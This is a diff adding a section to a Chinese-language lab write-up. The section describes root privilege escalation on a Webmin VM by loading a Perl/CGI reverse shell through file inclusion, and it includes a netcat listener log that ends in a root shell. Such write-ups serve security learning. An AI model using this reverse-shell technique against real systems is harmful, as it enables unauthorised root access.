@@ -304,3 +304,32 @@ root@ubuntuvm:/tmp#
 ```
 使用内核提权成功
 
+### 反弹shell提权
+由于忘记写了就删除了靶机，没有记录，只留存了root
+转述如下
+由于之前文件包含可以包含shadow文件，那么证明了webmin是root权限运行的
+查看文件权限也证明了`drwx------`
+那么反弹shell的方式就是在当前用户家目录下创建一个脚本
+webmin是由perl语言编写的，那么使用cgi脚本作为反弹shell
+因为apache服务器可以解释.cgi，大部分都是自动解释.cgi
+但是不能执行.pl
+cgi和pl是共通的，那么使用perl的反弹shell直接放在家目录
+文件包含就拿到系统权限了
+
+```bash
+┌──(kali㉿kali)-[~/workspace]
+└─$ sudo nc -lvnp 80                                                
+listening on [any] 80 ...
+connect to [10.10.10.13] from (UNKNOWN) [10.10.10.20] 42076
+ 04:57:07 up  9:33,  2 users,  load average: 0.21, 0.10, 0.02
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+vmware   pts/0    10.10.10.13      04:54   33.00s  0.19s  0.19s -bash
+obama    pts/1    10.10.10.4       01:37    1:50   0.13s  0.13s -bash
+Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
+uid=0(root) gid=0(root)
+/
+/usr/sbin/apache: can't access tty; job control turned off
+# whoami
+root
+#
+```
